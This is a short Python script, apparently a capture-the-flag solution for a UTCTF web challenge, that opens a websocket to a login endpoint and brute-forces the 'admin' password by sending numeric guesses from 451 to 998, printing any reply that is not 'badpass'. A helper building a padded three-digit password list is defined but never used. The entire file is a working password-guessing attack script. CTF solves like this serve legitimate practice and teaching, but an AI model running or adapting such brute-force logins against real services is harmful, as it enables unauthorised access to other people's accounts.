from websocket import create_connection

def brute_list():
    brute = [] 
    for i in range(1,9):
        brute.append('00'+str(i))
    for i in range(10,99):
        brute.append('0'+str(i))
    for i in range(100,1000):
        brute.append(str(i))
    return brute

def solve():
    brute = brute_list()
    print('Connected!')
    for i in range(451,999):
        ws = create_connection("ws://web1.utctf.live:8651/internal/ws")
        ws.send("begin")
        ws.send("user admin")
        print('Pass: '+str(i))
        ws.send("pass {}".format(str(i)))
        if 'badpass' not in ws.recv():
            print(ws.recv())
        ws.close()

if __name__=="__main__":
    solve()
